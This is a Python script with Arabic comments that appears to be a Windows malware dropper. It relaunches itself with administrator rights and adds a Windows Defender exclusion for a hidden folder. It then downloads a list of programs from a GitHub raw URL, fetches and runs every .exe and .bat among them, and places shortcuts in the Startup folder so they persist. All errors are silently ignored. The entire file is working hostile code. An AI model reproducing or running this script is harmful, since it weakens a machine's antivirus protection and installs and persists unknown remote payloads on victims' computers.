# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import requests
import subprocess
from pathlib import Path  # استيراد Path بشكل صحيح

def is_admin():
    """تحقق من أن البرنامج يعمل بحقوق المسؤول."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # إعادة تشغيل البرنامج بحقوق المسؤول
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def add_defender_exclusion(folder_path):
    """إضافة مجلد إلى قائمة الاستثناءات في Windows Defender."""
    try:
        powershell_command = f'Add-MpPreference -ExclusionPath "{folder_path}"'
        subprocess.run(["powershell", "-Command", powershell_command], check=True)
    except Exception:
        pass  # تجاهل الأخطاء

def download_programs(url, save_path):
    """تنزيل البرامج من الروابط في الملف النصي."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            programs = response.text.splitlines()
            for program_url in programs:
                if program_url.strip():
                    program_name = program_url.split('/')[-1]
                    program_path = os.path.join(save_path, program_name)
                    with open(program_path, 'wb') as f:
                        f.write(requests.get(program_url).content)
    except Exception:
        pass  # تجاهل الأخطاء

def create_hidden_folder(folder_path):
    """إنشاء مجلد مخفي إذا لم يكن موجودًا."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        os.system(f'attrib +h "{folder_path}"')

def create_shortcuts(programs_folder, startup_folder):
    """إنشاء اختصارات للبرامج في مجلد بدء التشغيل."""
    try:
        for program in os.listdir(programs_folder):
            program_path = os.path.join(programs_folder, program)
            if os.path.isfile(program_path):
                shortcut_name = f"{Path(program).stem}.lnk"  # استخدام Path هنا
                shortcut_path = os.path.join(startup_folder, shortcut_name)
                # إنشاء اختصار باستخدام PowerShell
                ps_command = f'$WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}"); $Shortcut.TargetPath = "{program_path}"; $Shortcut.WorkingDirectory = "{programs_folder}"; $Shortcut.Save()'
                subprocess.run(["powershell", "-Command", ps_command], check=True)
    except Exception:
        pass  # تجاهل الأخطاء

def run_programs(programs_folder):
    """تشغيل جميع البرامج ذات الامتدادات .exe و.bat."""
    supported_extensions = ['.exe', '.bat']
    for program in os.listdir(programs_folder):
        program_path = os.path.join(programs_folder, program)
        if os.path.isfile(program_path) and Path(program).suffix.lower() in supported_extensions:  # استخدام Path هنا
            try:
                subprocess.Popen([program_path], shell=True)
            except Exception:
                pass  # تجاهل الأخطاء

if __name__ == "__main__":
    # تعريف المسارات
    programs_folder = r"C:\userss"
    startup_folder = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
    programs_url = "https://raw.githubusercontent.com/uj9e/zzz/refs/heads/main/Redeagle/zzz.txt"

    # تنظيف الشاشة
    os.system('cls')

    # إضافة مجلد البرامج إلى استثناءات Windows Defender
    add_defender_exclusion(programs_folder)

    # إنشاء مجلد مخفي لتخزين البرامج
    create_hidden_folder(programs_folder)

    # تنزيل البرامج
    download_programs(programs_url, programs_folder)

    # إنشاء اختصارات للبرامج في مجلد بدء التشغيل
    create_shortcuts(programs_folder, startup_folder)

    # تشغيل البرامج بعد التنزيل
    run_programs(programs_folder)
